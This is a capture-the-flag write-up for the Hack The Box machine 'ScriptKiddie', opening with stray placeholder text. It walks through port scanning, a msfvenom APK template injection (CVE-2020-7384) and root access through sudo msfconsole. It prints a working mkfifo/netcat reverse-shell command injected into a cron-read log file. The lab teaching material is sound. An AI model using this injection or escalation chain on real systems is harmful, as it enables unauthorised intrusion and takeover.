# TEST123
asdfasdf

## Hackthebox.eu - ScriptKiddie
**February 7th, 2021**

This box was a web hosted script kiddies tool set. Utilizing known CVEs within the security tools it called on the back-end, we can get a reverse shell. From there we can abuse a poorly secured cronjob, to move laterally to another user who has password-less sudo configured for a tool that allows us to run commands.

### Quick Summary
* Craft a malicious android APK template for metasploit
* Upload template to the web front end and get a reverse shell
* Modify a log file to do bash command injection to get a second reverse shell
* Launch msfconsole with sudo, and drop to a ruby shell
* Read out the flag from ruby


#### Tools requried
Nothing fancy. a standard Ubuntu desktop should have everything you need by default

### Detailed steps
#### Port Scan
A portscan revealed a python web server on port 5000 and an active sshd service both running on an Ubuntu box of some kind.
```bash
$ nmap -sC -sV -oA nmap/init 10.10.10.226

 Nmap 7.91 scan initiated Sun Feb  7 11:01:09 2021 as: nmap -sC -sV -oA nmap/initial 10.10.10.226
Nmap scan report for 10.10.10.226
Host is up (0.040s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d\'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb  7 11:01:18 2021 -- 1 IP address (1 host up) scanned in 9.43 seconds
```


#### Web Server (:5000)
This web server was a front end to a bunch of hacking tools. Here's how it was laid out

* **nmap**: Puts the given IP into an nmap command and outputs the result. The input seems to be regex'd for IPs and I couldn't find any injection that worked.
* **sploits**: Searches for exploits by your given string. I tried command injection but it gives a warning that they will hack you back. This turns out to be important for getting root later.
* **payloads**: Generates meterpreter binaries for different platforms with an optional template. Only Android and windows seemed to work, while Linux threw an error.

##### CVE-2020-7384 (msfvenom APK template command injection)
The metasploit templates are binaries that are used as a frame to inject your payload into. Normally, you can use custom templates to help evade anti-virus and intrusion detection systems.

This CVE references the ability to gain command injection by crafting malicious APK templates for an android platform. I found a proof of concept for this attack, but it had a few issues I had to overcome. The resulting PoC I used can be found here: https://gist.github.com/lungdart/2aa3673a872e386ea5ddc36186727711

I used this tool to generate a malicious APK file, and uploaded it to the *payloads* section of the form. Listening with netcat gave me a reverse shell as the user ```kid```
```bash
kid@scriptkiddie:~/logs$ id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
```

Once I was in as the ```kid``` user, There was an existing SSH key that I stole to stabilize my connection to the box.

#### Privilege escalation to pwn
##### kid's home directory
```kid```'s home directory contain the source code for the website. The code for the searchsploit section showed that an attempt at command execution would have your IP written to the log file ```/home/kid/logs/hackers```, which was empty

```bash
kid@scriptkiddie:~$ cat logs/hackers

```

Taking a look at the home directory itself shows another user named ```pwn```

##### pwn's home directory
``pwn`` had a suspicious shell script that I had read access to called ```scanlosers.sh```. This script seemed to check the hackers log file from ```kid```'s home directory, and run nmaps on the target and recording the output. After it did this it would erase the file contents. Looking around showed that this script was running extremely often.

Because we had write access to ```/home/kid/logs/hackers```, we could craft an evil entry, that contained command injection instead of an IP. Then when the system ran ```/home/pwn/scanlosers.sh``` it would run my command as the ```pwn``` user, and give me a reverse shell as them. The evil log entry I came up with was ```[2021-02-07 17:57:52.187031] 1.1.1.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 5051 >/tmp/f;```. I ran a netcat listener and put that into the log file, and immediately was gifted with a second reverse shell.

#### Privilege escalation to root
Checking sudo shows that the ```pwn``` user has password-less sudo access for the msfconsole tool.
```bash
pwn@scriptkiddie:~$ sudo -l
User pwn may run the following commands:
    (root) NOPASSWD: /usr/bin/msfconsole
```

since msfconolse has an interactive ruby interpreter built in, we can launch that, then exec commands to read out the flag.
```bash
pwn@scriptkiddie:~$ sudo msfconsole
msf > irb
[*] Starting IRB shell...
```

```ruby
echo `cat /root/root.txt`
```

I submitted the flag and finished the box!
